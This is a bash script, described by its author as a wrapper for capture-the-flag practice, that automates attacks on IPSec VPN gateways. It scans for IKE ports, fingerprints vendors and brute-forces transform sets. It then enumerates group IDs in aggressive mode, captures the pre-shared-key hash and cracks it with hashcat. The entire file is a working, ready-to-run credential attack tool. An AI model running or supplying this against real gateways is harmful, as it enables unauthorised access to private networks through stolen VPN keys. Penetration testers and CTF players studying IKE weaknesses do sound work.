#!/bin/bash

RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
BOLD='\e[1m'
WHITE='\e[37m'
RESET='\e[0m'

target=""
networklevel_check=0

id_wordlist=""
password_wordlist=""
group_id=""

port=""
vendor_info=0
output_file=""

enc_algor=""
enc_code=0
hash_algor=""
hash_code=0
auth_method=""
auth_code=0
dh_group=-1
sa_lifetime=-1

PSK_FILE=""

cleanup () {
    [[ -n "$PSK_FILE" && -f "$PSK_FILE" ]] && rm -f "$PSK_FILE"
}
trap cleanup EXIT

show_title () {
    cat << 'EOF'
o 8                  .oo 8
8 8                 .P 8 8
8 8  .o  .oPYo.    .P  8 8oPYo. o    o .oPYo. .oPYo. oPYo.
8 8oP'   8oooo8   oPooo8 8    8 8    8 Yb..   8oooo8 8  `'
8 8 `b.  8.      .P    8 8    8 8    8   'Yb. 8.     8
8 8  `o. `Yooo' .P     8 `YooP' `YooP' `YooP' `Yooo' 8
....::...:.....:..:::::..:.....::.....::.....::.....:..::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
EOF

echo -e "\nJust a simple tool wrapper!"

}

help_wanted () {
    echo -e "\nIt's not that serious, just type the address of the target you THINK is exposing an IPSec gateway, the wordlist for the IDs, and the wordlist for the hashed password"
    echo -e "\nThe tool will perform the following operation in order to test the target machine:\n"
    echo "1) Perform an nmap scan to check if ports 500, or 4500 are open -> if not, it stops"
    echo "2) Then the process to find the right transformation start, first the default ike-scan payload in main mode is sent."
    echo "   If none of the default 8 transformations is valid, a brute force attack using all transformations possible is launched -> if still fail, it stops"
    echo "3) When a valid combination is found the tool start to check if the gateway is configured to return random hash if a random ID (group name) is sent to it -> if yes -> it stops"
    echo "4) If it's not the case we start bruteforcing IDs to find the right one using aggressive one (of course if aggressive mode is not enabled, you guessed it, it stops)"
    echo -e "5) If a valid ID is found we retrieve the hashed password, save it locally and then start cracking it offline using hashcat with rockyou.txt\n\n"

    echo "Optional flags: -p <port> to specify a custom IKE port, -vi to add vendor information to the output, -o <file> to save a report of the findings."
    echo "This wrapper is being built just to help me during CTFs, so yeah, nothing fancy to see!"
}

 valid_ip() {
    local  ip=$1
    local  stat=1
    regexv6='^([0-9a-fA-F]{0,4}:){1,7}[0-9a-fA-F]{0,4}$'

    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 \
            && ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
        stat=$?

    elif [[ $ip =~ $regexv6 ]]; then
        stat=0
    fi
    return $stat
}

require_value () {
    # $1 = option name, $2 = the value that follows it
    if [[ -z "$2" || "$2" == -* ]]; then
        echo "Option $1 requires an argument"
        exit 1
    fi
}

parse_parameters () {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -h|--help)
                help_wanted
                exit
                ;;
            -t|--target)
                require_value "$1" "$2"
                shift
                target=$1
                ;;
            -iw|--id_wordlist)
                require_value "$1" "$2"
                shift
                id_wordlist=$1
                ;;
            -pw|--pwd_wordlist)
                require_value "$1" "$2"
                shift
                password_wordlist=$1
                ;;
            -id|--group_id)
                require_value "$1" "$2"
                shift
                group_id=$1
                ;;
            -p|--port)
                require_value "$1" "$2"
                shift
                port=$1
                ;;
            -vi|--vendor)
                vendor_info=1
                ;;
            -o|--output)
                require_value "$1" "$2"
                shift
                output_file=$1
                ;;
            *)
                echo "Unknown option: $1"
                exit 1
                ;;
        esac
        shift
    done
}

report () {
    [[ -n "$output_file" ]] && echo -e "$1" >> "$output_file"
}

check_port () {
    local result

    if [[ -n "$port" ]]; then
        result=$(nmap -sU -p "$port" --open -oG - "$target" 2>&1)
        if echo "$result" | grep -qE "(^|[^0-9])$port/open" && ike-scan -M "$target":"$port" 2>&1 | grep -q "returned handshake"; then
            networklevel_check=1
        fi
    else
        result=$(nmap -sU -p 500,4500 --open -oG - "$target" 2>&1)
        if echo "$result" | grep -qE "(^|[^0-9])(500|4500)/open"; then
            networklevel_check=1
        fi
    fi
}

vendor_finder () {
    echo -e "${WHITE}[*] Fingerprinting gateway and collecting Vendor IDs...${RESET}"
    local out
    out=$(ike-scan -M -v "$target" 2>&1)

    local vids
    vids=$(echo "$out" | grep -oP 'VID=\S+ \(\K[^)]+')
    if [[ -n "$vids" ]]; then
        echo -e "${GREEN}[+] Vendor IDs detected:${RESET}"
        echo "$vids" | while read -r v; do
            echo -e "${GREEN}    - $v${RESET}"
            report "[VENDOR] $v"
        done
    else
        echo -e "${YELLOW}[!] No Vendor IDs returned${RESET}"
    fi

    local guess
    guess=$(ike-scan --showbackoff "$target" 2>&1 | grep -i "implementation guess")
    [[ -n "$guess" ]] && { echo -e "${GREEN}[+] $guess${RESET}"; report "[VENDOR] $guess"; }
}

parse_transformation () {
    enc_algor=$(echo "$1"   | grep -oP 'Enc=\K\S+')
    hash_algor=$(echo "$1"  | grep -oP 'Hash=\K\S+')
    auth_method=$(echo "$1" | grep -oP 'Auth=\K\S+')
    dh_group=$(echo "$1"    | grep -oP 'Group=\K[0-9]+')
    sa_lifetime=$(echo "$1" | grep -oP 'LifeDuration=\K[0-9]+')

    case "$enc_algor" in
        DES)  enc_code=1 ;;
        3DES) enc_code=5 ;;
        AES)  enc_code=7 ;;
        *)    enc_code=0 ;;
    esac
    case "$hash_algor" in
        MD5)  hash_code=1 ;;
        SHA1) hash_code=2 ;;
        *)    hash_code=0 ;;
    esac
    case "$auth_method" in
        PSK) auth_code=1 ;;
        RSA) auth_code=3 ;;
        *)   auth_code=0 ;;
    esac

    echo -e "${GREEN}[+] Trans: Enc=$enc_algor Hash=$hash_algor Auth=$auth_method Group=$dh_group Life=$sa_lifetime${RESET}"
    echo -e "${GREEN}[+] --trans code: ${enc_code},${hash_code},${auth_code},${dh_group}${RESET}"
    report "[TRANS] Enc=$enc_algor Hash=$hash_algor Auth=$auth_method Group=$dh_group Life=$sa_lifetime -> ${enc_code},${hash_code},${auth_code},${dh_group}"
}

isolate_transformation () {
    local single
    for single in "$@"; do
        local out
        out=$(ike-scan -M -v "$single" "$target" 2>&1)
        if echo "$out" | grep -q "1 returned handshake"; then
            echo "$out"
            return 0
        fi
    done
    return 1
}

transformation_finder () {
    local result=$(ike-scan -M -v "$target" 2>&1)

    echo -e "${WHITE}[*] Sending ike-scan default payload in main mode...${RESET}"
    if echo "$result" | grep -qE "1 returned handshake"; then
        echo -e "${GREEN}[+] Handshake received using default payload of ike-scan${RESET}"
        parse_transformation "$result"
        return 0

    elif echo "$result" | grep -qE "1 returned notify"; then
        echo -e "${WHITE}[*] No Handshake received using default payload, trying with bruteforce${RESET}"

        local batch=()
        local BATCH_SIZE=16
        local found=""

        for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do
            for HASH in 1 2 3 4 5 6; do
                for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do
                    for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do
                        batch+=("--trans=${ENC},${HASH},${AUTH},${GROUP}")

                        if (( ${#batch[@]} >= BATCH_SIZE )); then
                            if ike-scan -M "${batch[@]}" "$target" 2>&1 | grep -q "1 returned handshake"; then
                                found=$(isolate_transformation "${batch[@]}")
                                break 4
                            fi
                            batch=()
                        fi
                    done
                done
            done
        done

        if [[ -z "$found" && ${#batch[@]} -gt 0 ]]; then
            if ike-scan -M "${batch[@]}" "$target" 2>&1 | grep -q "1 returned handshake"; then
                found=$(isolate_transformation "${batch[@]}")
            fi
        fi

        if [[ -z "$found" ]]; then
            echo -e "${RED}[!] No valid transformation found after bruteforce. Stopping.${RESET}"
            exit 1
        fi

        parse_transformation "$found"
        return 0

    elif echo "$result" | grep -qE "0 returned handshake; 0 returned notify"; then
        echo -e "${RED}[!] Something went wrong! no response was received! ${RESET}"
        exit 1
    fi
}

id_enforcement_check () {
    local random_id="DefinitelyNotARealGroup$RANDOM"
    local trans="${enc_code},${hash_code},${auth_code},${dh_group}"
    local out
    out=$(ike-scan -M --aggressive --trans="$trans" --id="$random_id" "$target" 2>&1)

    if echo "$out" | grep -q "1 returned handshake"; then
        echo -e "${YELLOW}[!] Gateway answers to a random ID -> ID brute force won't discriminate. Stopping.${RESET}"
        exit 1
    else
        echo -e "${GREEN}[+] Gateway rejects unknown IDs -> good, ID brute force is meaningful${RESET}"
        return 0
    fi
}

id_finder () {
    local trans="${enc_code},${hash_code},${auth_code},${dh_group}"
    local found_id=""

    while read -r gid; do
        if ike-scan -M --aggressive --trans="$trans" --id="$gid" --pskcrack="$PSK_FILE" "$target" 2>&1 \
            | grep -q "1 returned handshake"; then
            echo -e "${GREEN}[+] Valid group ID found: $gid${RESET}"
            found_id="$gid"
            group_id="$found_id"
            break
        fi
    done < "$id_wordlist"

    [[ -z "$found_id" ]] && { echo -e "${RED}[!] No valid ID found${RESET}"; exit 1; }

    extract_psk_with_id "$found_id"
}

crack_psk () {
    echo -e "${WHITE}[*] Cracking PSK offline with hashcat...${RESET}"

    local mode
    case "$hash_code" in
        1) mode=5300 ;;   # IKE-PSK MD5
        2) mode=5400 ;;   # IKE-PSK SHA1
        *)
            echo -e "${RED}[!] Unknown hash type, can't pick hashcat mode${RESET}"
            exit 1
            ;;
    esac

    if [[ ! -s "$PSK_FILE" ]]; then
        echo -e "${RED}[!] No PSK hash captured, nothing to crack${RESET}"
        exit 1
    fi

    cp "$PSK_FILE" ./ike_psk.hash
    echo -e "${WHITE}[*] Hash saved to ./ike_psk.hash (resume with: hashcat -m $mode ike_psk.hash $password_wordlist)${RESET}"

    echo -e "${WHITE}[*] Running hashcat (mode $mode), please wait...${RESET}"

    hashcat -m "$mode" -a 0 --quiet "$PSK_FILE" "$password_wordlist" >/dev/null 2>&1

    local cracked
    cracked=$(hashcat -m "$mode" "$PSK_FILE" --show 2>/dev/null | awk -F: '{print $NF}')

    if [[ -n "$cracked" ]]; then
        echo -e "${GREEN}[+] PSK recovered: ${cracked}${RESET}"
        report "[PSK] $cracked"
    else
        echo -e "${RED}[!] PSK not found in the given wordlist${RESET}"
    fi
}

extract_psk_with_id () {
    local gid="$1"
    local trans="${enc_code},${hash_code},${auth_code},${dh_group}"
    echo -e "${WHITE}[*] Requesting aggressive mode handshake with ID '$gid'...${RESET}"
    ike-scan -M -A --trans="$trans" --id="$gid" --pskcrack="$PSK_FILE" "$target" 2>&1

    if [[ ! -s "$PSK_FILE" ]]; then
        echo -e "${RED}[!] No PSK hash captured with the given ID${RESET}"
        exit 1
    fi
    echo -e "${GREEN}[+] PSK hash saved to $PSK_FILE${RESET}"
}

main () {
    show_title
    parse_parameters "$@"

    PSK_FILE=$(mktemp /tmp/psk.XXXXXX)

    if [[ -n "$output_file" ]]; then
        > "$output_file"
        report "[TARGET] $target"
    fi

    echo -e "${WHITE}[*] Checking the given target...${RESET}"
    if ! valid_ip "$target"; then
        echo -e "${RED}[!] That's not a valid IP, check it! ${RESET}"
        exit 1
    else
        echo -e "${GREEN}[+] Target: $target ${RESET}"
    fi

    if [[ -z "$group_id" ]]; then
        if [[ -z "$id_wordlist" || ! -f "$id_wordlist" ]]; then
            echo -e "${RED}[!] No -id given and ID wordlist missing/not found. Use -iw <file> or -id <group_id>${RESET}"
            exit 1
        fi
    fi

    if [[ -z "$password_wordlist" || ! -f "$password_wordlist" ]]; then
        echo -e "${RED}[!] password wordlist missing or not found. Use -pw <file>${RESET}"
        exit 1
    fi

    if [[ -n "$port" ]]; then
        echo -e "${WHITE}[*] Checking if port $port hosts an IKE gateway...${RESET}"
    else
        echo -e "${WHITE}[*] Checking if port 500/4500 is open...${RESET}"
    fi
    check_port
    if [[ $networklevel_check -eq 0 ]]; then
        echo -e "${RED}[!] The default is closed, try manually to scan for other ports first, then pass the port as a parameter using -p ${RESET}"
        exit 1
    else
        echo -e "${GREEN}[+] port found! Hoping is vulnerable...${RESET}"
    fi

    [[ $vendor_info -eq 1 ]] && vendor_finder

    transformation_finder
    if [[ -n "$group_id" ]]; then
        echo -e "${GREEN}[+] Group ID provided manually: $group_id -> skipping ID brute force${RESET}"
        extract_psk_with_id "$group_id"
    else
        id_enforcement_check
        id_finder
    fi
    crack_psk
}

main "$@"
